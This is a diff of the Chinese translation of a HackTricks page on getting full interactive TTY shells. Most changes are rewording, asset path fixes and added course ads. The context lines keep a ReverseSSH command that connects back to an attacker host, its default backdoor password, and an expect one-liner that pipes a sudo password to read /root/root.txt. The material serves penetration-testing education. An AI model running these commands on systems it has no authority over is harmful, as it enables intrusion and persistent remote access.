@@ -1,23 +1,29 @@
 # Full TTYs
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+通过 8kSec 学院深化您在 **移动安全** 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
+
+{% embed url="https://academy.8ksec.io/" %}
+
 ## Full TTY
 
-请注意，您在 `SHELL` 变量中设置的 shell **必须**在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。此外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在获取 shell 之前通过运行 `bash` 切换到 bash。
+请注意，您在 `SHELL` 变量中设置的 shell **必须** 在 _**/etc/shells**_ 中 **列出**，否则会出现 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`。此外，请注意，以下代码片段仅在 bash 中有效。如果您在 zsh 中，请在通过运行 `bash` 获取 shell 之前切换到 bash。
 
 #### Python
 
@@ -104,7 +110,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* 如果 ReverseSSH 端口转发请求成功，您现在应该能够使用默认密码 `letmeinbrudipls` 登录，前提是以运行 `reverse-ssh(.exe)` 的用户身份：
+* 如果 ReverseSSH 端口转发请求成功，您现在应该能够使用默认密码 `letmeinbrudipls` 登录，前提是您在运行 `reverse-ssh(.exe)` 的用户上下文中：
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -124,17 +130,23 @@ sftp -P 8888 127.0.0.1
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+深入了解 **移动安全**，请访问 8kSec Academy。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** 上关注我们。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
